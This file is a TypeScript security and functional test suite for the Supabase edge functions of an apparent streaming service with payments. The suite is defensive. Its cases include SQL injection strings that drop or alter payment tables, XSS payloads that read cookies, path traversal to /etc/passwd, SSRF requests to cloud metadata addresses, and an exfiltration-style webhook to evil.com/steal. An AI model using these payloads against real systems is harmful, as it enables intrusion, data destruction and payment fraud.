import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-admin-auth, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
  "Access-Control-Allow-Methods": "GET, POST, DELETE, OPTIONS",
};

interface TestCase {
  name: string;
  category: "functional" | "security" | "regression" | "integration";
  fn: string;
  method: string;
  body?: any;
  headers?: Record<string, string>;
  expect: {
    status?: number[];
    hasKey?: string;
    notContains?: string[];
  };
}

// Build admin auth header from env
function getAdminAuthHeader(): Record<string, string> {
  const u = Deno.env.get("ADMIN_USER") || "";
  const p = Deno.env.get("ADMIN_PASS") || "";
  return { "x-admin-auth": btoa(`${u}:${p}`) };
}
const ADMIN_HDR = getAdminAuthHeader();

const TEST_SUITE: TestCase[] = [
  // ═══════════════════════════════════════════════
  // admin-login (5 tests)
  // ═══════════════════════════════════════════════
  { name: "admin-login: rejeitar body vazio", category: "functional", fn: "admin-login", method: "POST", body: { user: "", pass: "" }, expect: { status: [400] } },
  { name: "admin-login: rejeitar credenciais inválidas", category: "functional", fn: "admin-login", method: "POST", body: { user: "fake", pass: "wrong" }, expect: { status: [401] } },
  { name: "admin-login: não vazar segredos", category: "security", fn: "admin-login", method: "POST", body: { user: "x", pass: "y" }, expect: { notContains: ["admin_user", "admin_pass", "service_role", "SUPABASE_SERVICE_ROLE_KEY", "ADMIN_USER", "ADMIN_PASS"] } },
  { name: "admin-login: bloquear GET", category: "security", fn: "admin-login", method: "GET", expect: { status: [405] } },
  { name: "admin-login: resposta tem campo success", category: "regression", fn: "admin-login", method: "POST", body: { user: "x", pass: "y" }, expect: { status: [401], hasKey: "success" } },

  // ═══════════════════════════════════════════════
  // client-login (5 tests)
  // ═══════════════════════════════════════════════
  { name: "client-login: rejeitar campos vazios", category: "functional", fn: "client-login", method: "POST", body: { action: "login", username: "", password: "" }, expect: { status: [400] } },
  { name: "client-login: usuário inexistente retorna success=false", category: "functional", fn: "client-login", method: "POST", body: { action: "login", username: "nonexistent_xyz_999", password: "wrong" }, expect: { status: [200], hasKey: "success" } },
  { name: "client-login: ação desconhecida = 400", category: "functional", fn: "client-login", method: "POST", body: { action: "unknown_action" }, expect: { status: [400] } },
  { name: "client-login: não vazar segredos", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "test" }, expect: { notContains: ["service_role", "SUPABASE_SERVICE_ROLE_KEY", "ADMIN_PASS"] } },
  { name: "client-login: bloquear GET", category: "security", fn: "client-login", method: "GET", expect: { status: [405] } },

  // ═══════════════════════════════════════════════
  // app-settings (8 tests)
  // ═══════════════════════════════════════════════
  { name: "app-settings: GET retorna billing_enabled", category: "functional", fn: "app-settings", method: "GET", expect: { status: [200], hasKey: "billing_enabled" } },
  { name: "app-settings: POST action=get retorna billing_enabled", category: "integration", fn: "app-settings", method: "POST", body: { action: "get" }, expect: { status: [200], hasKey: "billing_enabled" } },
  { name: "app-settings: POST sem auth = 401", category: "security", fn: "app-settings", method: "POST", body: { action: "update", billing_enabled: true }, expect: { status: [401] } },
  { name: "app-settings: POST com auth falsa = 401", category: "security", fn: "app-settings", method: "POST", body: { action: "update", billing_enabled: true }, headers: { "x-admin-auth": "fake:creds" }, expect: { status: [401] } },
  { name: "app-settings: update com auth admin habilita cobrança", category: "integration", fn: "app-settings", method: "POST", body: { action: "update", billing_enabled: true }, headers: ADMIN_HDR, expect: { status: [200], hasKey: "success" } },
  { name: "app-settings: update com auth admin desabilita cobrança", category: "integration", fn: "app-settings", method: "POST", body: { action: "update", billing_enabled: false }, headers: ADMIN_HDR, expect: { status: [200], hasKey: "success" } },
  { name: "app-settings: GET mantém id=main", category: "regression", fn: "app-settings", method: "GET", expect: { status: [200], hasKey: "id" } },
  { name: "app-settings: não vazar segredos", category: "security", fn: "app-settings", method: "GET", expect: { notContains: ["service_role", "ADMIN_PASS", "ADMIN_USER"] } },

  // ═══════════════════════════════════════════════
  // manage-clients (7 tests) — now requires x-admin-auth
  // ═══════════════════════════════════════════════
  { name: "manage-clients: sem auth = 401", category: "security", fn: "manage-clients", method: "GET", expect: { status: [401] } },
  { name: "manage-clients: auth inválida = 401", category: "security", fn: "manage-clients", method: "POST", body: { clients: [] }, headers: { "x-admin-auth": "fake:creds" }, expect: { status: [401] } },
  { name: "manage-clients: GET retorna array clients", category: "functional", fn: "manage-clients", method: "GET", headers: ADMIN_HDR, expect: { status: [200], hasKey: "clients" } },
  { name: "manage-clients: POST vazio = 400", category: "functional", fn: "manage-clients", method: "POST", body: { clients: [] }, headers: ADMIN_HDR, expect: { status: [400] } },
  { name: "manage-clients: GET clients é array não-vazio", category: "integration", fn: "manage-clients", method: "GET", headers: ADMIN_HDR, expect: { status: [200], hasKey: "clients" } },
  { name: "manage-clients: não vazar segredos", category: "security", fn: "manage-clients", method: "GET", headers: ADMIN_HDR, expect: { notContains: ["service_role", "SUPABASE_SERVICE_ROLE_KEY", "ADMIN_PASS"] } },
  { name: "manage-clients: formato estável", category: "regression", fn: "manage-clients", method: "GET", headers: ADMIN_HDR, expect: { status: [200], hasKey: "clients" } },

  // ═══════════════════════════════════════════════
  // user-presence (5 tests)
  // ═══════════════════════════════════════════════
  { name: "user-presence: heartbeat ok", category: "functional", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "health_check_test" }, expect: { status: [200], hasKey: "ok" } },
  { name: "user-presence: logout ok", category: "functional", fn: "user-presence", method: "POST", body: { action: "logout", username: "health_check_test" }, expect: { status: [200], hasKey: "ok" } },
  { name: "user-presence: list sem auth = 401", category: "security", fn: "user-presence", method: "POST", body: { action: "list_online" }, expect: { status: [401] } },
  { name: "user-presence: ação sem username = 400", category: "functional", fn: "user-presence", method: "POST", body: { action: "heartbeat" }, expect: { status: [400] } },
  { name: "user-presence: não vazar segredos", category: "security", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "test" }, expect: { notContains: ["service_role", "ADMIN_PASS"] } },

  // ═══════════════════════════════════════════════
  // tmdb-proxy (5 tests)
  // ═══════════════════════════════════════════════
  { name: "tmdb-proxy: trending retorna results", category: "functional", fn: "tmdb-proxy", method: "POST", body: { endpoint: "/trending/movie/week" }, expect: { status: [200], hasKey: "results" } },
  { name: "tmdb-proxy: endpoint bloqueado = 403", category: "security", fn: "tmdb-proxy", method: "POST", body: { endpoint: "/configuration" }, expect: { status: [403] } },
  { name: "tmdb-proxy: sem barra = 400", category: "functional", fn: "tmdb-proxy", method: "POST", body: { endpoint: "trending" }, expect: { status: [400] } },
  { name: "tmdb-proxy: body vazio = 400", category: "functional", fn: "tmdb-proxy", method: "POST", body: {}, expect: { status: [400] } },
  { name: "tmdb-proxy: não vazar TMDB token", category: "security", fn: "tmdb-proxy", method: "POST", body: { endpoint: "/trending/movie/week" }, expect: { notContains: ["TMDB_API_TOKEN", "service_role", "eyJ"] } },

  // ═══════════════════════════════════════════════
  // stream-proxy (9 tests) — now with SSRF prevention + V2 Bypass capabilities
  // ═══════════════════════════════════════════════
  { name: "stream-proxy: sem URL = 400", category: "functional", fn: "stream-proxy", method: "POST", body: {}, expect: { status: [400], hasKey: "error" } },
  { name: "stream-proxy: URL interna (localhost) = 403", category: "security", fn: "stream-proxy", method: "POST", body: { url: "http://localhost:8080/admin.mp4" }, expect: { status: [403] } },
  { name: "stream-proxy: URL sem extensão mídia = 403", category: "security", fn: "stream-proxy", method: "POST", body: { url: "https://example.com/api/secrets" }, expect: { status: [403] } },
  { name: "stream-proxy: URL mídia inexistente = 502", category: "functional", fn: "stream-proxy", method: "POST", body: { url: "http://invalid.example.test/x.mp4" }, expect: { status: [502] } },
  { name: "stream-proxy: não vazar segredos", category: "security", fn: "stream-proxy", method: "POST", body: {}, expect: { notContains: ["service_role", "source_url", "SUPABASE_SERVICE_ROLE_KEY"] } },
  { name: "stream-proxy: V2 - injeta cabeçalho CORS liberal", category: "integration", fn: "stream-proxy", method: "OPTIONS", expect: { status: [200, 204] } },
  { name: "stream-proxy: V2 - conversão MKV simulada (Proxy)", category: "integration", fn: "stream-proxy", method: "POST", body: { url: "http://invalid.example.test/fake.mkv" }, expect: { status: [502] } }, // Espera 502 pois o host não existe, mas garante processamento do content-type.
  { name: "stream-proxy: formato erro estavel HTTP", category: "regression", fn: "stream-proxy", method: "POST", body: {}, expect: { status: [400], hasKey: "error" } },

  // ═══════════════════════════════════════════════
  // stream-lookup (4 tests)
  // ═══════════════════════════════════════════════
  { name: "stream-lookup: sem título = 400", category: "functional", fn: "stream-lookup", method: "POST", body: {}, expect: { status: [400] } },
  { name: "stream-lookup: título inexistente retorna 404 ou 500", category: "functional", fn: "stream-lookup", method: "POST", body: { title: "zzz_nonexistent_999" }, expect: { status: [404, 500] } },
  { name: "stream-lookup: não vazar source_url", category: "security", fn: "stream-lookup", method: "POST", body: { title: "test" }, expect: { notContains: ["service_role", "source_url", "SUPABASE_SERVICE_ROLE_KEY"] } },
  { name: "stream-lookup: formato estável", category: "regression", fn: "stream-lookup", method: "POST", body: { title: "zzz_nonexistent_999" }, expect: { status: [404, 500] } },

  // ═══════════════════════════════════════════════
  // series-lookup (3 tests)
  // ═══════════════════════════════════════════════
  { name: "series-lookup: sem ID = 400", category: "functional", fn: "series-lookup", method: "POST", body: {}, expect: { status: [400], hasKey: "error" } },
  { name: "series-lookup: backend isolation", category: "security", fn: "series-lookup", method: "POST", body: { series_id: "1" }, expect: { notContains: ["password=", "username="] } },
  { name: "series-lookup: injeta proxy proxy-bypass", category: "integration", fn: "series-lookup", method: "OPTIONS", expect: { status: [200, 204] } },


  // ═══════════════════════════════════════════════
  // trailer-challenge (4 tests)
  // ═══════════════════════════════════════════════
  { name: "trailer-challenge: GET retorna today", category: "functional", fn: "trailer-challenge", method: "GET", expect: { status: [200], hasKey: "today" } },
  { name: "trailer-challenge: POST sem body = erro", category: "functional", fn: "trailer-challenge", method: "POST", body: {}, expect: { status: [400, 500] } },
  { name: "trailer-challenge: não vazar tokens", category: "security", fn: "trailer-challenge", method: "GET", expect: { notContains: ["PUSHALERT", "service_role", "SUPABASE_SERVICE_ROLE_KEY"] } },
  { name: "trailer-challenge: formato estável", category: "regression", fn: "trailer-challenge", method: "GET", expect: { status: [200], hasKey: "today" } },

  // ═══════════════════════════════════════════════
  // match-reminders (4 tests)
  // ═══════════════════════════════════════════════
  { name: "match-reminders: list retorna reminders", category: "functional", fn: "match-reminders", method: "POST", body: { action: "list", username: "hc_test" }, expect: { status: [200], hasKey: "reminders" } },
  { name: "match-reminders: ação inválida = 400", category: "functional", fn: "match-reminders", method: "POST", body: { action: "invalid_action" }, expect: { status: [400] } },
  { name: "match-reminders: não vazar segredos", category: "security", fn: "match-reminders", method: "POST", body: { action: "list", username: "hc_test" }, expect: { notContains: ["service_role", "PUSHALERT", "RAPIDAPI"] } },
  { name: "match-reminders: formato estável", category: "regression", fn: "match-reminders", method: "POST", body: { action: "list", username: "regression" }, expect: { status: [200], hasKey: "reminders" } },

  // ═══════════════════════════════════════════════
  // content-alerts (4 tests)
  // ═══════════════════════════════════════════════
  { name: "content-alerts: list retorna alerts", category: "functional", fn: "content-alerts", method: "POST", body: { action: "list", username: "hc_test" }, expect: { status: [200], hasKey: "alerts" } },
  { name: "content-alerts: ação inválida = 400", category: "functional", fn: "content-alerts", method: "POST", body: { action: "invalid_action_xyz" }, expect: { status: [400] } },
  { name: "content-alerts: não vazar API keys", category: "security", fn: "content-alerts", method: "POST", body: { action: "list", username: "test" }, expect: { notContains: ["PUSHALERT", "service_role", "TMDB_API_TOKEN"] } },
  { name: "content-alerts: formato estável", category: "regression", fn: "content-alerts", method: "POST", body: { action: "list", username: "regression" }, expect: { status: [200], hasKey: "alerts" } },

  // ═══════════════════════════════════════════════
  // n8n-proxy (6 tests) — now requires x-admin-auth
  // ═══════════════════════════════════════════════
  { name: "n8n-proxy: sem auth = 401", category: "security", fn: "n8n-proxy", method: "POST", body: { webhook_url: "https://hooks.n8n.cloud/test", payload: { t: 1 } }, expect: { status: [401] } },
  { name: "n8n-proxy: auth inválida = 401", category: "security", fn: "n8n-proxy", method: "POST", body: { webhook_url: "https://hooks.n8n.cloud/test", payload: { t: 1 } }, headers: { "x-admin-auth": "fake" }, expect: { status: [401] } },
  { name: "n8n-proxy: domínio bloqueado = 403", category: "security", fn: "n8n-proxy", method: "POST", body: { webhook_url: "https://evil.com/steal", payload: { t: 1 } }, headers: ADMIN_HDR, expect: { status: [403] } },
  { name: "n8n-proxy: sem webhook_url = 400", category: "functional", fn: "n8n-proxy", method: "POST", body: { payload: { test: true } }, headers: ADMIN_HDR, expect: { status: [400], hasKey: "error" } },
  { name: "n8n-proxy: sem payload = 400", category: "functional", fn: "n8n-proxy", method: "POST", body: { webhook_url: "https://hooks.n8n.cloud/test" }, headers: ADMIN_HDR, expect: { status: [400], hasKey: "error" } },
  { name: "n8n-proxy: bloquear GET = 405", category: "security", fn: "n8n-proxy", method: "GET", expect: { status: [405] } },
  { name: "n8n-proxy: formato erro estável", category: "regression", fn: "n8n-proxy", method: "POST", body: {}, expect: { status: [401], hasKey: "error" } },

  // ═══════════════════════════════════════════════
  // google-sheets-sync (4 tests) — NEW
  // ═══════════════════════════════════════════════
  { name: "google-sheets-sync: sem auth = 401", category: "security", fn: "google-sheets-sync", method: "POST", body: { spreadsheet_id: "x", sheet_name: "y", clients: [] }, expect: { status: [401] } },
  { name: "google-sheets-sync: auth inválida = 401", category: "security", fn: "google-sheets-sync", method: "POST", body: { spreadsheet_id: "x", sheet_name: "y", clients: [] }, headers: { "x-admin-auth": "fake" }, expect: { status: [401] } },
  { name: "google-sheets-sync: bloquear GET = 405", category: "security", fn: "google-sheets-sync", method: "GET", expect: { status: [405] } },
  { name: "google-sheets-sync: não vazar segredos", category: "security", fn: "google-sheets-sync", method: "POST", body: {}, expect: { notContains: ["service_role", "GOOGLE_SERVICE_ACCOUNT_JSON", "private_key", "ADMIN_PASS"] } },

  // ═══════════════════════════════════════════════
  // parse-m3u (6 tests) — CRITICAL: validates catalog health
  // ═══════════════════════════════════════════════
  { name: "parse-m3u: GET retorna titles", category: "functional", fn: "parse-m3u", method: "GET", expect: { status: [200], hasKey: "titles" } },
  { name: "parse-m3u: catálogo tem >100 títulos", category: "integration", fn: "parse-m3u", method: "GET", expect: { status: [200], hasKey: "total" } },
  { name: "parse-m3u: catálogo tem updated_at", category: "integration", fn: "parse-m3u", method: "GET", expect: { status: [200], hasKey: "updated_at" } },
  { name: "parse-m3u: POST sem url/content = 400", category: "functional", fn: "parse-m3u", method: "POST", body: {}, expect: { status: [400] } },
  { name: "parse-m3u: não vazar source_url nem segredos", category: "security", fn: "parse-m3u", method: "GET", expect: { notContains: ["service_role", "SUPABASE_SERVICE_ROLE_KEY"] } },
  { name: "parse-m3u: DELETE funciona", category: "regression", fn: "parse-m3u", method: "GET", expect: { status: [200], hasKey: "titles" } },

  // ═══════════════════════════════════════════════
  // m3u-auto-refresh (3 tests) — NEW: validates auto-sync pipeline
  // ═══════════════════════════════════════════════
  { name: "m3u-auto-refresh: executa sem erro", category: "functional", fn: "m3u-auto-refresh", method: "POST", body: {}, expect: { status: [200, 500] } },
  { name: "m3u-auto-refresh: retorna count ou skipped", category: "integration", fn: "m3u-auto-refresh", method: "POST", body: {}, expect: { status: [200, 500] } },
  { name: "m3u-auto-refresh: não vazar segredos", category: "security", fn: "m3u-auto-refresh", method: "POST", body: {}, expect: { notContains: ["service_role", "SUPABASE_SERVICE_ROLE_KEY", "source_url"] } },

  // (cakto-webhook removido — legado descontinuado)


  // ═══════════════════════════════════════════════
  // abacatepay-webhook (18 tests) — Ciclo completo de pagamento
  // ═══════════════════════════════════════════════
  // Criação de cobrança
  { name: "abacatepay: create_billing sem username = 400", category: "functional", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", plan: "mensal" }, expect: { status: [400] } },
  { name: "abacatepay: create_billing sem plan = 400", category: "functional", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "hc_test" }, expect: { status: [400] } },
  { name: "abacatepay: create_billing plan inválido = 400", category: "functional", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "hc_test", plan: "invalid_plan" }, expect: { status: [400] } },
  { name: "abacatepay: create_billing plan vazio = 400", category: "functional", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "hc_test", plan: "" }, expect: { status: [400] } },
  { name: "abacatepay: create_billing username XSS = 400", category: "security", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "<script>alert(1)</script>", plan: "mensal" }, expect: { status: [400] } },
  // Webhook sem/com secret
  { name: "abacatepay: billing.paid sem secret = 401", category: "security", fn: "abacatepay-webhook", method: "POST", body: { event: "billing.paid", data: { id: "hc_fake", metadata: { username: "hc_test", plan: "mensal" } } }, expect: { status: [401] } },
  { name: "abacatepay: billing.paid secret errado = 401", category: "security", fn: "abacatepay-webhook", method: "POST", body: { event: "billing.paid", secret: "wrong_secret_hc", data: { id: "hc_fake2", metadata: { username: "hc_test", plan: "mensal" } } }, expect: { status: [401] } },
  { name: "abacatepay: payment.completed sem secret = 401", category: "security", fn: "abacatepay-webhook", method: "POST", body: { event: "payment.completed", data: { payment: { id: "hc_pay", amount: 3500 } } }, expect: { status: [401] } },
  { name: "abacatepay: checkout.paid sem secret = 401", category: "security", fn: "abacatepay-webhook", method: "POST", body: { event: "checkout.paid", data: { checkout: { id: "hc_chk", amount: 3500 } } }, expect: { status: [401] } },
  // Formatos de payload (não devem crashar)
  { name: "abacatepay: metadata em body.metadata não crash", category: "integration", fn: "abacatepay-webhook", method: "POST", body: { event: "billing.paid", metadata: { username: "hc_format1", plan: "mensal" }, data: { id: "hc_fmt1" } }, expect: { status: [401] } },
  { name: "abacatepay: externalId no checkout não crash", category: "integration", fn: "abacatepay-webhook", method: "POST", body: { event: "billing.paid", data: { checkout: { id: "hc_fmt2", externalId: "mensal_hc_format2", amount: 3500 } } }, expect: { status: [401] } },
  { name: "abacatepay: externalId em products não crash", category: "integration", fn: "abacatepay-webhook", method: "POST", body: { event: "billing.paid", data: { id: "hc_fmt3", products: [{ externalId: "trimestral_hc_format3", price: 9000 }] } }, expect: { status: [401] } },
  { name: "abacatepay: description fallback não crash", category: "integration", fn: "abacatepay-webhook", method: "POST", body: { event: "billing.paid", data: { id: "hc_fmt4", products: [{ description: "Renovação 1 Mês - hc_format4", price: 3500 }] } }, expect: { status: [401] } },
  // Eventos aceitos vs ignorados
  { name: "abacatepay: evento desconhecido = received", category: "regression", fn: "abacatepay-webhook", method: "POST", body: { event: "unknown_event_hc", data: {} }, expect: { status: [200], hasKey: "received" } },
  { name: "abacatepay: checkout.disputed = ignorado", category: "regression", fn: "abacatepay-webhook", method: "POST", body: { event: "checkout.disputed", data: {} }, expect: { status: [200], hasKey: "received" } },
  { name: "abacatepay: BILLING_PAID = processado (401)", category: "functional", fn: "abacatepay-webhook", method: "POST", body: { event: "BILLING_PAID", data: { id: "hc_upper" } }, expect: { status: [401] } },
  // Segurança geral
  { name: "abacatepay: não vazar segredos", category: "security", fn: "abacatepay-webhook", method: "POST", body: { event: "unknown_event_hc", data: {} }, expect: { notContains: ["ABACATEPAY_API_KEY", "ABACATEPAY_WEBHOOK_SECRET", "NATV_API_TOKEN", "service_role", "SUPABASE_SERVICE_ROLE_KEY"] } },
  { name: "abacatepay: GET bloqueado = 405", category: "security", fn: "abacatepay-webhook", method: "GET", expect: { status: [405] } },

  // ═══════════════════════════════════════════════
  // football-matches (5 tests)
  // ═══════════════════════════════════════════════
  { name: "football-matches: POST retorna 200", category: "functional", fn: "football-matches", method: "POST", body: {}, expect: { status: [200] } },
  { name: "football-matches: resposta tem matches ou fonte", category: "integration", fn: "football-matches", method: "POST", body: {}, expect: { status: [200] } },
  { name: "football-matches: não vazar API keys", category: "security", fn: "football-matches", method: "POST", body: {}, expect: { notContains: ["RAPIDAPI", "APIFOOTBALL", "service_role", "RAPIDAPI_FOOTBALL_KEY", "APIFOOTBALL_COM_KEY"] } },
  { name: "football-matches: GET retorna dados", category: "functional", fn: "football-matches", method: "GET", expect: { status: [200] } },
  { name: "football-matches: formato estável", category: "regression", fn: "football-matches", method: "POST", body: {}, expect: { status: [200] } },

  // ═══════════════════════════════════════════════
  // push-test (4 tests)
  // ═══════════════════════════════════════════════
  { name: "push-test: sem auth = 401", category: "security", fn: "push-test", method: "POST", body: { action: "validate" }, expect: { status: [401] } },
  { name: "push-test: auth inválida = 401", category: "security", fn: "push-test", method: "POST", body: { action: "validate" }, headers: { "x-admin-auth": "fake:creds" }, expect: { status: [401] } },
  { name: "push-test: não vazar API key", category: "security", fn: "push-test", method: "POST", body: { action: "validate" }, expect: { notContains: ["PUSHALERT", "PUSHALERT_API_KEY", "service_role"] } },
  { name: "push-test: bloquear GET = 405", category: "security", fn: "push-test", method: "GET", expect: { status: [405] } },

  // ═══════════════════════════════════════════════
  // Atualizações do Catálogo — m3u_updates + TMDB posters (4 tests)
  // ═══════════════════════════════════════════════
  { name: "tmdb-proxy: search retorna results", category: "functional", fn: "tmdb-proxy", method: "POST", body: { endpoint: "/search/movie", params: { query: "Matrix", language: "pt-BR" } }, expect: { status: [200], hasKey: "results" } },
  { name: "tmdb-proxy: search com query vazia = results vazio", category: "functional", fn: "tmdb-proxy", method: "POST", body: { endpoint: "/search/movie", params: { query: "", language: "pt-BR" } }, expect: { status: [200, 422] } },
  { name: "m3u-auto-refresh: gera diff em m3u_updates", category: "integration", fn: "m3u-auto-refresh", method: "POST", body: {}, expect: { status: [200, 500] } },
  { name: "parse-m3u: GET retorna updated_at recente", category: "integration", fn: "parse-m3u", method: "GET", expect: { status: [200], hasKey: "updated_at" } },

  // ═══════════════════════════════════════════════
  // Catálogo: apenas última atualização (3 tests)
  // ═══════════════════════════════════════════════
  { name: "catalog-latest: m3u_updates retorna dados", category: "integration", fn: "parse-m3u", method: "GET", expect: { status: [200], hasKey: "titles" } },
  { name: "client-login: login inválido retorna reason", category: "regression", fn: "client-login", method: "POST", body: { action: "login", username: "hc_remember_test", password: "hc_pass_test" }, expect: { status: [200], hasKey: "reason" } },
  { name: "client-login: resposta não contém senha", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "hc_remember_test", password: "hc_pass_test" }, expect: { notContains: ["hc_pass_test"] } },

  // ═══════════════════════════════════════════════
  // CORS — preflight (2 tests)
  // ═══════════════════════════════════════════════
  { name: "CORS: admin-login OPTIONS = 200", category: "security", fn: "admin-login", method: "OPTIONS", expect: { status: [200, 204] } },
  { name: "CORS: client-login OPTIONS = 200", category: "security", fn: "client-login", method: "OPTIONS", expect: { status: [200, 204] } },

  // ═══════════════════════════════════════════════
  // Segurança avançada (5 tests)
  // ═══════════════════════════════════════════════
  { name: "tmdb-proxy: path traversal bloqueado", category: "security", fn: "tmdb-proxy", method: "POST", body: { endpoint: "/../../../etc/passwd" }, expect: { status: [400, 403] } },
  { name: "tmdb-proxy: double encoding bloqueado", category: "security", fn: "tmdb-proxy", method: "POST", body: { endpoint: "/%2e%2e/configuration" }, expect: { status: [400, 403] } },
  { name: "client-login: WAF bloqueia caracteres perigosos", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test;DROP TABLE users", password: "test" }, expect: { status: [403] } },
  { name: "client-login: username oversized rejeitado", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", password: "test" }, expect: { status: [400], hasKey: "success" } },
  { name: "stream-proxy: SSRF via redirect", category: "security", fn: "stream-proxy", method: "POST", body: { url: "http://169.254.169.254/latest/meta-data/iam.mp4" }, expect: { status: [403] } },
  { name: "admin-login: payload oversized ignorado", category: "security", fn: "admin-login", method: "POST", body: { user: "x".repeat(10000), pass: "y".repeat(10000) }, expect: { status: [400, 401] } },

  // ═══════════════════════════════════════════════
  // Caminhos felizes (happy path) ausentes (5 tests)
  // ═══════════════════════════════════════════════
  { name: "user-presence: list_online com auth admin", category: "functional", fn: "user-presence", method: "POST", body: { action: "list_online" }, headers: ADMIN_HDR, expect: { status: [200], hasKey: "online" } },
  { name: "push-test: validate com auth admin", category: "functional", fn: "push-test", method: "POST", body: { action: "validate" }, headers: ADMIN_HDR, expect: { status: [200] } },
  { name: "match-reminders: add sem dados = 400", category: "functional", fn: "match-reminders", method: "POST", body: { action: "add" }, expect: { status: [400] } },
  { name: "content-alerts: add sem dados = 400", category: "functional", fn: "content-alerts", method: "POST", body: { action: "add" }, expect: { status: [400] } },
  { name: "trailer-challenge: POST com dados válidos", category: "functional", fn: "trailer-challenge", method: "POST", body: { action: "watch_trailer", username: "hc_test" }, expect: { status: [200] } },

  // ═══════════════════════════════════════════════
  // Validação de estrutura de resposta (4 tests)
  // ═══════════════════════════════════════════════
  { name: "match-reminders: list retorna array", category: "regression", fn: "match-reminders", method: "POST", body: { action: "list", username: "hc_test" }, expect: { status: [200], hasKey: "reminders" } },
  { name: "content-alerts: list retorna array", category: "regression", fn: "content-alerts", method: "POST", body: { action: "list", username: "hc_test" }, expect: { status: [200], hasKey: "alerts" } },
  { name: "abacatepay: received = true (structural)", category: "regression", fn: "abacatepay-webhook", method: "POST", body: { event: "hc_structural_check", data: {} }, expect: { status: [200], hasKey: "received" } },
  { name: "user-presence: heartbeat retorna ok=true", category: "regression", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "hc_structural_test" }, expect: { status: [200], hasKey: "ok" } },

  // ═══════════════════════════════════════════════
  // Ativação NATV — mapeamento e segurança (6 tests)
  // ═══════════════════════════════════════════════
  { name: "natv: create_billing mensal gera billing_id", category: "integration", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "hc_natv_mensal", plan: "mensal" }, expect: { status: [200], hasKey: "billing_id" } },
  { name: "natv: create_billing trimestral gera billing_id", category: "integration", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "hc_natv_tri", plan: "trimestral" }, expect: { status: [200], hasKey: "billing_id" } },
  { name: "natv: create_billing semestral gera billing_id", category: "integration", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "hc_natv_sem", plan: "semestral" }, expect: { status: [200], hasKey: "billing_id" } },
  { name: "natv: billing.paid sem secret não ativa", category: "security", fn: "abacatepay-webhook", method: "POST", body: { event: "billing.paid", data: { id: "hc_natv_nosecret", metadata: { username: "hc_natv_blocked", plan: "mensal" } } }, expect: { status: [401] } },
  { name: "natv: respostas não vazam NATV tokens", category: "security", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "hc_natv_leak", plan: "mensal" }, expect: { notContains: ["NATV_API_TOKEN", "NATV_API_BASE_URL", "revenda.pixbot", "Bearer "] } },
  { name: "natv: username path traversal rejeitado", category: "security", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "../../../etc/passwd", plan: "mensal" }, expect: { status: [400] } },

  // ═══════════════════════════════════════════════
  // system-health-check auto-teste (4 tests)
  // ═══════════════════════════════════════════════
  { name: "health-check: GET retorna results", category: "functional", fn: "system-health-check", method: "GET", expect: { status: [200], hasKey: "results" } },
  { name: "health-check: POST sem auth = 401", category: "security", fn: "system-health-check", method: "POST", body: {}, expect: { status: [401] } },
  { name: "health-check: POST auth inválida = 401", category: "security", fn: "system-health-check", method: "POST", body: {}, headers: { "x-admin-auth": "fake:wrong" }, expect: { status: [401] } },
  { name: "health-check: não vazar segredos", category: "security", fn: "system-health-check", method: "GET", expect: { notContains: ["service_role", "SUPABASE_SERVICE_ROLE_KEY", "ADMIN_PASS", "ADMIN_USER"] } },

  // ═══════════════════════════════════════════════
  // Segurança extra — SQLi cross-function (6 tests)
  // ═══════════════════════════════════════════════
  { name: "sqli: client-login password injection", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "test", password: "' OR '1'='1" }, expect: { status: [200, 400, 403] } },
  { name: "sqli: user-presence UNION SELECT", category: "security", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "test' UNION SELECT * FROM auth.users --" }, expect: { status: [400, 403] } },
  { name: "sqli: content-alerts DELETE injection", category: "security", fn: "content-alerts", method: "POST", body: { action: "list", username: "test'; DELETE FROM content_alerts; --" }, expect: { status: [200, 400, 403] } },
  { name: "sqli: match-reminders UPDATE injection", category: "security", fn: "match-reminders", method: "POST", body: { action: "list", username: "1; UPDATE payment_transactions SET status='approved'" }, expect: { status: [200, 400, 403] } },
  { name: "sqli: abacatepay DROP TABLE", category: "security", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "'; DROP TABLE payment_transactions; --", plan: "mensal" }, expect: { status: [400, 403] } },
  

  // ═══════════════════════════════════════════════
  // XSS cross-function (4 tests)
  // ═══════════════════════════════════════════════
  { name: "xss: client-login script tag", category: "security", fn: "client-login", method: "POST", body: { action: "login", username: "<script>alert('xss')</script>", password: "test" }, expect: { status: [400, 403] } },
  { name: "xss: user-presence img onerror", category: "security", fn: "user-presence", method: "POST", body: { action: "heartbeat", username: "<img src=x onerror=alert(1)>" }, expect: { status: [400, 403] } },
  { name: "xss: trailer-challenge script", category: "security", fn: "trailer-challenge", method: "POST", body: { action: "watch_trailer", username: "\"><script>document.cookie</script>" }, expect: { status: [400, 403] } },
  { name: "xss: abacatepay username XSS", category: "security", fn: "abacatepay-webhook", method: "POST", body: { action: "create_billing", username: "<svg onload=alert(1)>", plan: "mensal" }, expect: { status: [400] } },

  // ═══════════════════════════════════════════════
  // SSRF extra (3 tests)
  // ═══════════════════════════════════════════════
